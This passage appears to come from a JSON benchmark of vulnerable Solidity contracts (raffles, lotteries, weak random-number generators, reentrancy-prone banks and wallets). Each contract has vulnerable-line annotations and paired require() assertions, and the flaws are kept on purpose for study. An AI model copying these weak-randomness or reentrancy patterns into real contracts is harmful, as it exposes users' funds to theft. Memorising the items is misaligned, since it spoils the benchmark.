raffleId++;\n        nextTicket = 0;\n\n        blockNumber = block.number;\n\n        // gaps.length = 0 isn't necessary here,\n        // because buyTickets() eventually clears\n        // the gaps array in the loop itself.\n\n        // Distribute prize and fee\n        winningAddress.transfer(prize);\n        feeAddress.transfer(fee);\n    }\n\n    // Get your money back before the raffle occurs\n    function getRefund() public {\n        uint refund = 0;\n        for (uint i = 0; i < totalTickets; i++) {\n            if (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {\n                refund += pricePerTicket;\n                contestants[i] = Contestant(address(0), 0);\n                gaps.push(i);\n                TicketRefund(raffleId, msg.sender, i);\n            }\n        }\n\n        if (refund > 0) {\n            msg.sender.transfer(refund);\n        }\n    }\n\n    // Refund everyone's money, start a new raffle, then pause it\n    function endRaffle() public {\n        if (msg.sender == feeAddress) {\n            paused = true;\n\n            for (uint i = 0; i < totalTickets; i++) {\n                if (raffleId == contestants[i].raffleId) {\n                    TicketRefund(raffleId, contestants[i].addr, i);\n                    contestants[i].addr.transfer(pricePerTicket);\n                }\n            }\n\n            RaffleResult(raffleId, totalTickets, address(0), address(0), address(0), 0, 0);\n            raffleId++;\n            nextTicket = 0;\n\n            blockNumber = block.number;\n            gaps.length = 0;\n        }\n    }\n\n    function togglePause() public {\n        if (msg.sender == feeAddress) {\n            paused = !paused;\n        }\n    }\n\n    function kill() public {\n        if (msg.sender == feeAddress) {\n            selfdestruct(feeAddress);\n        }\n    }\n}",
            {
                "VL": [
                    100,
                    "require(seed1!=address(0));"
                ],
                "pre": [
                    98,
                    "require(nextTicket==totalTickets);"
                ],
                "post": [
                    123,
                    "require(block.number>blockNumber);"
                ]
            }
        ],
        [
            "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xcC88937F325d1C6B97da0AFDbb4cA542EFA70870#code\n * @vulnerable_at_lines: 49,99,101,103,114,158\n * @author: -\n */\n\n pragma solidity ^0.4.16;\n\ncontract Ethraffle_v4b {\n    struct Contestant {\n        address addr;\n        uint raffleId;\n    }\n\n    event RaffleResult(\n        uint raffleId,\n        uint winningNumber,\n        address winningAddress,\n        address seed1,\n        address seed2,\n        uint seed3,\n        bytes32 randHash\n    );\n\n    event TicketPurchase(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    event TicketRefund(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    // Constants\n    uint public constant prize = 2.5 ether;\n    uint public constant fee = 0.03 ether;\n    uint public constant totalTickets = 50;\n    uint public constant pricePerTicket = (prize + fee) / totalTickets; // Make sure this divides evenly\n    address feeAddress;\n\n    // Other internal variables\n    bool public paused = false;\n    uint public raffleId = 1;\n\n    uint public blockNumber = block.number;\n    uint nextTicket = 0;\n    mapping (uint => Contestant) contestants;\n    uint[] gaps;\n\n    // Initialization\n    function Ethraffle_v4b() public {\n        feeAddress = msg.sender;\n    }\n\n    // Call buyTickets() when receiving Ether outside a function\n    function () payable public {\n        buyTickets();\n    }\n\n    function buyTickets() payable public {\n        if (paused) {\n            msg.sender.transfer(msg.value);\n            return;\n        }\n\n        uint moneySent = msg.value;\n\n        while (moneySent >= pricePerTicket && nextTicket < totalTickets) {\n            uint currTicket = 0;\n            if (gaps.length > 0) {\n                currTicket = gaps[gaps.length-1];\n                gaps.length--;\n            } else {\n                currTicket = nextTicket++;\n            }\n\n            contestants[currTicket] = Contestant(msg.sender, raffleId);\n            TicketPurchase(raffleId, msg.sender, currTicket);\n            moneySent -= pricePerTicket;\n        }\n\n        // Choose winner if we sold all the tickets\n        if (nextTicket == totalTickets) {\n            chooseWinner();\n        }\n\n        // Send back leftover money\n        if (moneySent > 0) {\n            msg.sender.transfer(moneySent);\n        }\n    }\n\n    function chooseWinner() private {\n\n        address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;\n\n        address seed2 = contestants[uint(msg.sender) % totalTickets].addr;\n\n        uint seed3 = block.difficulty;\n        bytes32 randHash = keccak256(seed1, seed2, seed3);\n\n        uint winningNumber = uint(randHash) % totalTickets;\n        address winningAddress = contestants[winningNumber].addr;\n        RaffleResult(raffleId, winningNumber, winningAddress, seed1, seed2, seed3, randHash);\n\n        // Start next raffle\n        raffleId++;\n        nextTicket = 0;\n\n        blockNumber = block.number;\n\n        // gaps.length = 0 isn't necessary here,\n        // because buyTickets() eventually clears\n        // the gaps array in the loop itself.\n\n        // Distribute prize and fee\n        winningAddress.transfer(prize);\n        feeAddress.transfer(fee);\n    }\n\n    // Get your money back before the raffle occurs\n    function getRefund() public {\n        uint refund = 0;\n        for (uint i = 0; i < totalTickets; i++) {\n            if (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {\n                refund += pricePerTicket;\n                contestants[i] = Contestant(address(0), 0);\n                gaps.push(i);\n                TicketRefund(raffleId, msg.sender, i);\n            }\n        }\n\n        if (refund > 0) {\n            msg.sender.transfer(refund);\n        }\n    }\n\n    // Refund everyone's money, start a new raffle, then pause it\n    function endRaffle() public {\n        if (msg.sender == feeAddress) {\n            paused = true;\n\n            for (uint i = 0; i < totalTickets; i++) {\n                if (raffleId == contestants[i].raffleId) {\n                    TicketRefund(raffleId, contestants[i].addr, i);\n                    contestants[i].addr.transfer(pricePerTicket);\n                }\n            }\n\n            RaffleResult(raffleId, totalTickets, address(0), address(0), address(0), 0, 0);\n            raffleId++;\n            nextTicket = 0;\n\n            blockNumber = block.number;\n            gaps.length = 0;\n        }\n    }\n\n    function togglePause() public {\n        if (msg.sender == feeAddress) {\n            paused = !paused;\n        }\n    }\n\n    function kill() public {\n        if (msg.sender == feeAddress) {\n            selfdestruct(feeAddress);\n        }\n    }\n}",
            {
                "VL": [
                    102,
                    "require(seed1!=address(0)&&seed2!=address(0));"
                ],
                "pre": [
                    98,
                    "require(nextTicket==totalTickets);"
                ],
                "post": [
                    123,
                    "require(block.number>blockNumber);"
                ]
            }
        ],
        [
            "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xcC88937F325d1C6B97da0AFDbb4cA542EFA70870#code\n * @vulnerable_at_lines: 49,99,101,103,114,158\n * @author: -\n */\n\n pragma solidity ^0.4.16;\n\ncontract Ethraffle_v4b {\n    struct Contestant {\n        address addr;\n        uint raffleId;\n    }\n\n    event RaffleResult(\n        uint raffleId,\n        uint winningNumber,\n        address winningAddress,\n        address seed1,\n        address seed2,\n        uint seed3,\n        bytes32 randHash\n    );\n\n    event TicketPurchase(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    event TicketRefund(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    // Constants\n    uint public constant prize = 2.5 ether;\n    uint public constant fee = 0.03 ether;\n    uint public constant totalTickets = 50;\n    uint public constant pricePerTicket = (prize + fee) / totalTickets; // Make sure this divides evenly\n    address feeAddress;\n\n    // Other internal variables\n    bool public paused = false;\n    uint public raffleId = 1;\n\n    uint public blockNumber = block.number;\n    uint nextTicket = 0;\n    mapping (uint => Contestant) contestants;\n    uint[] gaps;\n\n    // Initialization\n    function Ethraffle_v4b() public {\n        feeAddress = msg.sender;\n    }\n\n    // Call buyTickets() when receiving Ether outside a function\n    function () payable public {\n        buyTickets();\n    }\n\n    function buyTickets() payable public {\n        if (paused) {\n            msg.sender.transfer(msg.value);\n            return;\n        }\n\n        uint moneySent = msg.value;\n\n        while (moneySent >= pricePerTicket && nextTicket < totalTickets) {\n            uint currTicket = 0;\n            if (gaps.length > 0) {\n                currTicket = gaps[gaps.length-1];\n                gaps.length--;\n            } else {\n                currTicket = nextTicket++;\n            }\n\n            contestants[currTicket] = Contestant(msg.sender, raffleId);\n            TicketPurchase(raffleId, msg.sender, currTicket);\n            moneySent -= pricePerTicket;\n        }\n\n        // Choose winner if we sold all the tickets\n        if (nextTicket == totalTickets) {\n            chooseWinner();\n        }\n\n        // Send back leftover money\n        if (moneySent > 0) {\n            msg.sender.transfer(moneySent);\n        }\n    }\n\n    function chooseWinner() private {\n\n        address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;\n\n        address seed2 = contestants[uint(msg.sender) % totalTickets].addr;\n\n        uint seed3 = block.difficulty;\n        bytes32 randHash = keccak256(seed1, seed2, seed3);\n\n        uint winningNumber = uint(randHash) % totalTickets;\n        address winningAddress = contestants[winningNumber].addr;\n        RaffleResult(raffleId, winningNumber, winningAddress, seed1, seed2, seed3, randHash);\n\n        // Start next raffle\n        raffleId++;\n        nextTicket = 0;\n\n        blockNumber = block.number;\n\n        // gaps.length = 0 isn't necessary here,\n        // because buyTickets() eventually clears\n        // the gaps array in the loop itself.\n\n        // Distribute prize and fee\n        winningAddress.transfer(prize);\n        feeAddress.transfer(fee);\n    }\n\n    // Get your money back before the raffle occurs\n    function getRefund() public {\n        uint refund = 0;\n        for (uint i = 0; i < totalTickets; i++) {\n            if (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {\n                refund += pricePerTicket;\n                contestants[i] = Contestant(address(0), 0);\n                gaps.push(i);\n                TicketRefund(raffleId, msg.sender, i);\n            }\n        }\n\n        if (refund > 0) {\n            msg.sender.transfer(refund);\n        }\n    }\n\n    // Refund everyone's money, start a new raffle, then pause it\n    function endRaffle() public {\n        if (msg.sender == feeAddress) {\n            paused = true;\n\n            for (uint i = 0; i < totalTickets; i++) {\n                if (raffleId == contestants[i].raffleId) {\n                    TicketRefund(raffleId, contestants[i].addr, i);\n                    contestants[i].addr.transfer(pricePerTicket);\n                }\n            }\n\n            RaffleResult(raffleId, totalTickets, address(0), address(0), address(0), 0, 0);\n            raffleId++;\n            nextTicket = 0;\n\n            blockNumber = block.number;\n            gaps.length = 0;\n        }\n    }\n\n    function togglePause() public {\n        if (msg.sender == feeAddress) {\n            paused = !paused;\n        }\n    }\n\n    function kill() public {\n        if (msg.sender == feeAddress) {\n            selfdestruct(feeAddress);\n        }\n    }\n}",
            {
                "VL": [
                    113,
                    "require(block.number>blockNumber);"
                ],
                "pre": [
                    98,
                    "require(nextTicket==totalTickets);"
                ],
                "post": [
                    123,
                    "require(block.number>blockNumber);"
                ]
            }
        ],
        [
            "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xcC88937F325d1C6B97da0AFDbb4cA542EFA70870#code\n * @vulnerable_at_lines: 49,99,101,103,114,158\n * @author: -\n */\n\n pragma solidity ^0.4.16;\n\ncontract Ethraffle_v4b {\n    struct Contestant {\n        address addr;\n        uint raffleId;\n    }\n\n    event RaffleResult(\n        uint raffleId,\n        uint winningNumber,\n        address winningAddress,\n        address seed1,\n        address seed2,\n        uint seed3,\n        bytes32 randHash\n    );\n\n    event TicketPurchase(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    event TicketRefund(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    // Constants\n    uint public constant prize = 2.5 ether;\n    uint public constant fee = 0.03 ether;\n    uint public constant totalTickets = 50;\n    uint public constant pricePerTicket = (prize + fee) / totalTickets; // Make sure this divides evenly\n    address feeAddress;\n\n    // Other internal variables\n    bool public paused = false;\n    uint public raffleId = 1;\n\n    uint public blockNumber = block.number;\n    uint nextTicket = 0;\n    mapping (uint => Contestant) contestants;\n    uint[] gaps;\n\n    // Initialization\n    function Ethraffle_v4b() public {\n        feeAddress = msg.sender;\n    }\n\n    // Call buyTickets() when receiving Ether outside a function\n    function () payable public {\n        buyTickets();\n    }\n\n    function buyTickets() payable public {\n        if (paused) {\n            msg.sender.transfer(msg.value);\n            return;\n        }\n\n        uint moneySent = msg.value;\n\n        while (moneySent >= pricePerTicket && nextTicket < totalTickets) {\n            uint currTicket = 0;\n            if (gaps.length > 0) {\n                currTicket = gaps[gaps.length-1];\n                gaps.length--;\n            } else {\n                currTicket = nextTicket++;\n            }\n\n            contestants[currTicket] = Contestant(msg.sender, raffleId);\n            TicketPurchase(raffleId, msg.sender, currTicket);\n            moneySent -= pricePerTicket;\n        }\n\n        // Choose winner if we sold all the tickets\n        if (nextTicket == totalTickets) {\n            chooseWinner();\n        }\n\n        // Send back leftover money\n        if (moneySent > 0) {\n            msg.sender.transfer(moneySent);\n        }\n    }\n\n    function chooseWinner() private {\n\n        address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;\n\n        address seed2 = contestants[uint(msg.sender) % totalTickets].addr;\n\n        uint seed3 = block.difficulty;\n        bytes32 randHash = keccak256(seed1, seed2, seed3);\n\n        uint winningNumber = uint(randHash) % totalTickets;\n        address winningAddress = contestants[winningNumber].addr;\n        RaffleResult(raffleId, winningNumber, winningAddress, seed1, seed2, seed3, randHash);\n\n        // Start next raffle\n        raffleId++;\n        nextTicket = 0;\n\n        blockNumber = block.number;\n\n        // gaps.length = 0 isn't necessary here,\n        // because buyTickets() eventually clears\n        // the gaps array in the loop itself.\n\n        // Distribute prize and fee\n        winningAddress.transfer(prize);\n        feeAddress.transfer(fee);\n    }\n\n    // Get your money back before the raffle occurs\n    function getRefund() public {\n        uint refund = 0;\n        for (uint i = 0; i < totalTickets; i++) {\n            if (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {\n                refund += pricePerTicket;\n                contestants[i] = Contestant(address(0), 0);\n                gaps.push(i);\n                TicketRefund(raffleId, msg.sender, i);\n            }\n        }\n\n        if (refund > 0) {\n            msg.sender.transfer(refund);\n        }\n    }\n\n    // Refund everyone's money, start a new raffle, then pause it\n    function endRaffle() public {\n        if (msg.sender == feeAddress) {\n            paused = true;\n\n            for (uint i = 0; i < totalTickets; i++) {\n                if (raffleId == contestants[i].raffleId) {\n                    TicketRefund(raffleId, contestants[i].addr, i);\n                    contestants[i].addr.transfer(pricePerTicket);\n                }\n            }\n\n            RaffleResult(raffleId, totalTickets, address(0), address(0), address(0), 0, 0);\n            raffleId++;\n            nextTicket = 0;\n\n            blockNumber = block.number;\n            gaps.length = 0;\n        }\n    }\n\n    function togglePause() public {\n        if (msg.sender == feeAddress) {\n            paused = !paused;\n        }\n    }\n\n    function kill() public {\n        if (msg.sender == feeAddress) {\n            selfdestruct(feeAddress);\n        }\n    }\n}",
            {
                "VL": [
                    157,
                    "require(block.number>blockNumber);"
                ],
                "pre": [
                    144,
                    "require(block.number>blockNumber+1000);"
                ],
                "post": [
                    161,
                    "require(paused);"
                ]
            }
        ]
    ],
    "random_number_generator.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/weak_randomness/random_number_generator.sol\n * @author: -\n * @vulnerable_at_lines: 12,18,20,22\n */\n\npragma solidity ^0.4.25;\n\n// Based on TheRun contract deployed at 0xcac337492149bDB66b088bf5914beDfBf78cCC18.\ncontract RandomNumberGenerator {\n\n  uint256 private salt =  block.timestamp;\n\n  function random(uint max) view private returns (uint256 result) {\n    // Get the best seed for randomness\n    uint256 x = salt * 100 / max;\n\n    uint256 y = salt * block.number / (salt % 5);\n\n    uint256 seed = block.number / 3 + (salt % 300) + y;\n\n    uint256 h = uint256(blockhash(seed));\n    // Random number between 1 and max\n    return uint256((h / x)) % max + 1;\n  }\n}",
            {
                "VL": [
                    11,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    11,
                    "require(msg.sender==owner);"
                ],
                "post": [
                    26,
                    "require(random(10)==1);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/weak_randomness/random_number_generator.sol\n * @author: -\n * @vulnerable_at_lines: 12,18,20,22\n */\n\npragma solidity ^0.4.25;\n\n// Based on TheRun contract deployed at 0xcac337492149bDB66b088bf5914beDfBf78cCC18.\ncontract RandomNumberGenerator {\n\n  uint256 private salt =  block.timestamp;\n\n  function random(uint max) view private returns (uint256 result) {\n    // Get the best seed for randomness\n    uint256 x = salt * 100 / max;\n\n    uint256 y = salt * block.number / (salt % 5);\n\n    uint256 seed = block.number / 3 + (salt % 300) + y;\n\n    uint256 h = uint256(blockhash(seed));\n    // Random number between 1 and max\n    return uint256((h / x)) % max + 1;\n  }\n}",
            {
                "VL": [
                    17,
                    "require(max>0);"
                ],
                "pre": [
                    15,
                    "require(max>0);"
                ],
                "post": [
                    25,
                    "require(result>0);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/weak_randomness/random_number_generator.sol\n * @author: -\n * @vulnerable_at_lines: 12,18,20,22\n */\n\npragma solidity ^0.4.25;\n\n// Based on TheRun contract deployed at 0xcac337492149bDB66b088bf5914beDfBf78cCC18.\ncontract RandomNumberGenerator {\n\n  uint256 private salt =  block.timestamp;\n\n  function random(uint max) view private returns (uint256 result) {\n    // Get the best seed for randomness\n    uint256 x = salt * 100 / max;\n\n    uint256 y = salt * block.number / (salt % 5);\n\n    uint256 seed = block.number / 3 + (salt % 300) + y;\n\n    uint256 h = uint256(blockhash(seed));\n    // Random number between 1 and max\n    return uint256((h / x)) % max + 1;\n  }\n}",
            {
                "VL": [
                    19,
                    "require(max>0);"
                ],
                "pre": [
                    15,
                    "require(max>0);"
                ],
                "post": [
                    25,
                    "require(result>0);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/weak_randomness/random_number_generator.sol\n * @author: -\n * @vulnerable_at_lines: 12,18,20,22\n */\n\npragma solidity ^0.4.25;\n\n// Based on TheRun contract deployed at 0xcac337492149bDB66b088bf5914beDfBf78cCC18.\ncontract RandomNumberGenerator {\n\n  uint256 private salt =  block.timestamp;\n\n  function random(uint max) view private returns (uint256 result) {\n    // Get the best seed for randomness\n    uint256 x = salt * 100 / max;\n\n    uint256 y = salt * block.number / (salt % 5);\n\n    uint256 seed = block.number / 3 + (salt % 300) + y;\n\n    uint256 h = uint256(blockhash(seed));\n    // Random number between 1 and max\n    return uint256((h / x)) % max + 1;\n  }\n}",
            {
                "VL": [
                    21,
                    "require(max>0);"
                ],
                "pre": [
                    15,
                    "require(max>0);"
                ],
                "post": [
                    25,
                    "require(result>0);"
                ]
            }
        ]
    ],
    "lottery.sol": [
        [
            "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0x80ddae5251047d6ceb29765f38fed1c0013004b7#code\n * @vulnerable_at_lines: 38,42\n * @author: -\n */\n\n //added pragma version\n  pragma solidity ^0.4.0;\n  \n contract Lottery {\n     event GetBet(uint betAmount, uint blockNumber, bool won);\n\n     struct Bet {\n         uint betAmount;\n         uint blockNumber;\n         bool won;\n     }\n\n     address private organizer;\n     Bet[] private bets;\n\n     // Create a new lottery with numOfBets supported bets.\n     function Lottery() {\n         organizer = msg.sender;\n     }\n\n     // Fallback function returns ether\n     function() {\n         throw;\n     }\n\n     // Make a bet\n     function makeBet() {\n         // Won if block number is even\n         // (note: this is a terrible source of randomness, please don't use this with real money)\n\n         bool won = (block.number % 2) == 0;\n\n         // Record the bet with an event\n\n         bets.push(Bet(msg.value, block.number, won));\n\n         // Payout if the user won, otherwise take their money\n         if(won) {\n             if(!msg.sender.send(msg.value)) {\n                 // Return ether to sender\n                 throw;\n             }\n         }\n     }\n\n     // Get all bets that have been made\n     function getBets() {\n         if(msg.sender != organizer) { throw; }\n\n         for (uint i = 0; i < bets.length; i++) {\n             GetBet(bets[i].betAmount, bets[i].blockNumber, bets[i].won);\n         }\n     }\n\n     // Suicide :(\n     function destroy() {\n         if(msg.sender != organizer) { throw; }\n\n         suicide(organizer);\n     }\n }",
            {
                "VL": [
                    37,
                    "require(msg.value>0);"
                ],
                "pre": [
                    35,
                    "require(msg.value>0);"
                ],
                "post": [
                    51,
                    "require(msg.sender.send(msg.value));"
                ]
            }
        ],
        [
            "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0x80ddae5251047d6ceb29765f38fed1c0013004b7#code\n * @vulnerable_at_lines: 38,42\n * @author: -\n */\n\n //added pragma version\n  pragma solidity ^0.4.0;\n  \n contract Lottery {\n     event GetBet(uint betAmount, uint blockNumber, bool won);\n\n     struct Bet {\n         uint betAmount;\n         uint blockNumber;\n         bool won;\n     }\n\n     address private organizer;\n     Bet[] private bets;\n\n     // Create a new lottery with numOfBets supported bets.\n     function Lottery() {\n         organizer = msg.sender;\n     }\n\n     // Fallback function returns ether\n     function() {\n         throw;\n     }\n\n     // Make a bet\n     function makeBet() {\n         // Won if block number is even\n         // (note: this is a terrible source of randomness, please don't use this with real money)\n\n         bool won = (block.number % 2) == 0;\n\n         // Record the bet with an event\n\n         bets.push(Bet(msg.value, block.number, won));\n\n         // Payout if the user won, otherwise take their money\n         if(won) {\n             if(!msg.sender.send(msg.value)) {\n                 // Return ether to sender\n                 throw;\n             }\n         }\n     }\n\n     // Get all bets that have been made\n     function getBets() {\n         if(msg.sender != organizer) { throw; }\n\n         for (uint i = 0; i < bets.length; i++) {\n             GetBet(bets[i].betAmount, bets[i].blockNumber, bets[i].won);\n         }\n     }\n\n     // Suicide :(\n     function destroy() {\n         if(msg.sender != organizer) { throw; }\n\n         suicide(organizer);\n     }\n }",
            {
                "VL": [
                    41,
                    "require(msg.value>0);"
                ],
                "pre": [
                    35,
                    "require(msg.value>0);"
                ],
                "post": [
                    51,
                    "require(msg.sender.send(msg.value));"
                ]
            }
        ]
    ],
    "reentrancy_insecure.sol": [
        [
            "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/\n * @author: consensys\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.5.0;\n\ncontract Reentrancy_insecure {\n\n    // INSECURE\n    mapping (address => uint) private userBalances;\n\n    function withdrawBalance() public {\n        uint amountToWithdraw = userBalances[msg.sender];\n\n        (bool success, ) = msg.sender.call.value(amountToWithdraw)(\"\"); // At this point, the caller's code is executed, and can call withdrawBalance again\n        require(success);\n        userBalances[msg.sender] = 0;\n    }\n}",
            {
                "VL": [
                    16,
                    "require(amountToWithdraw>0);"
                ],
                "pre": [
                    15,
                    "require(userBalances[msg.sender]>0);"
                ],
                "post": [
                    20,
                    "require(amountToWithdraw<=address(this).balance);"
                ]
            }
        ]
    ],
    "0x561eac93c92360949ab1f1403323e6db345cbf31.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract BANK_SAFE\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    53,
                    "require(balances[msg.sender]>=_am);"
                ],
                "pre": [
                    51,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    60,
                    "require(balances[msg.sender]>=MinSum);"
                ]
            }
        ]
    ],
    "reentrancy_cross_function.sol": [
        [
            "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/\n * @author: consensys\n * @vulnerable_at_lines: 24\n */\n\npragma solidity ^0.4.24;\n\ncontract Reentrancy_cross_function {\n\n    // INSECURE\n    mapping (address => uint) private userBalances;\n\n    function transfer(address to, uint amount) {\n        if (userBalances[msg.sender] >= amount) {\n            userBalances[to] += amount;\n            userBalances[msg.sender] -= amount;\n        }\n    }\n\n    function withdrawBalance() public {\n        uint amountToWithdraw = userBalances[msg.sender];\n\n        (bool success, ) = msg.sender.call.value(amountToWithdraw)(\"\"); // At this point, the caller's code is executed, and can call transfer()\n        require(success);\n        userBalances[msg.sender] = 0;\n    }\n}",
            {
                "VL": [
                    23,
                    "require(amountToWithdraw>0);"
                ],
                "pre": [
                    22,
                    "require(userBalances[msg.sender]>0);"
                ],
                "post": [
                    27,
                    "require(amountToWithdraw<=address(this).balance);"
                ]
            }
        ]
    ],
    "reentrance.sol": [
        [
            "/*\n * @source: https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488\n * @author: Alejandro Santander\n * @vulnerable_at_lines: 24\n */\n\npragma solidity ^0.4.18;\n\ncontract Reentrance {\n\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] += msg.value;\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n\n      if(msg.sender.call.value(_amount)()) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  function() public payable {}\n}",
            {
                "VL": [
                    23,
                    "require(_amount<=address(this).balance);"
                ],
                "pre": [
                    22,
                    "require(_amount>0);"
                ],
                "post": [
                    29,
                    "require(msg.sender.call.value(_amount)());"
                ]
            }
        ]
    ],
    "0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract WALLET\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function WALLET(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    28,
                    "require(_am<=acc.balance);"
                ],
                "pre": [
                    25,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    35,
                    "require(acc.balance>=MinSum);"
                ]
            }
        ]
    ],
    "0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol": [
        [
            "\n/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 55\n */\n\npragma solidity ^0.4.19;\n\ncontract ACCURAL_DEPOSIT\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum = 1 ether;\n    \n    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)revert();\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)revert();\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    54,
                    "require(balances[msg.sender]>=_am);"
                ],
                "pre": [
                    52,
                    "require(_am>0);"
                ],
                "post": [
                    61,
                    "require(balances[msg.sender]>=MinSum);"
                ]
            }
        ]
    ],
    "0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol": [
        [
